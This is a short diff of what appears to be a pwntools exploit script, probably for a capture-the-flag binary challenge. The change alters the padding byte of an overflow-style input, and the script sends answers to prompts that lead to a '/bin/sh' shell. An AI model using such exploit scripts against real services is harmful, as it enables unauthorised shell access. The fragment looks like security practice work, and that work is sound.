@@ -31,7 +31,7 @@ def get_interger():
         log.error("Not Found!!!")
 
 if __name__ == "__main__":
-    io.sendafter(" = ", str(get_interger()).ljust(0x100, '\x11'))
+    io.sendafter(" = ", str(get_interger()).ljust(0x100, '\x7f'))
     io.sendafter("al?\n", "N0\0")
     #  DEBUG([0xEA0, 0xE7F])
     io.sendafter("/bin/sh\n", "1\0")
